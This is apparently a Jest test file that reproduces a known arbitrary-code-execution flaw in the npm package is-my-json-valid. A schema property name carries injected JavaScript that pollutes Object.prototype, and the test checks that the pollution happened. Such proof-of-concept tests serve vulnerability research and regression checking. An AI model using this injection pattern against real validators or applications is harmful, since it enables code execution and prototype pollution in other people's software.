//https://security.snyk.io/vuln/SNYK-JS-ISMYJSONVALID-597167
test("Arbitrary code execution in is-my-json-valid", () => {
  const fs = require("fs");
  const validator = require("is-my-json-valid");
  const path = "./is-my-json-valid";
  const sleep = require("sleep");

  file_exist = fs.existsSync(path);
  expect({}.polluted).toBe(undefined);

  const schema = {
    type: "object",
    properties: {
      "x[1 + (Object.prototype.polluted='yes')]": {
        required: true,
        type: "string",
      },
    },
  };
  try {
    let validate = validator(schema);
    validate({});
  } catch (e) {}

  file_exist = fs.existsSync(path);
  expect({}.polluted).toBe("yes");

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
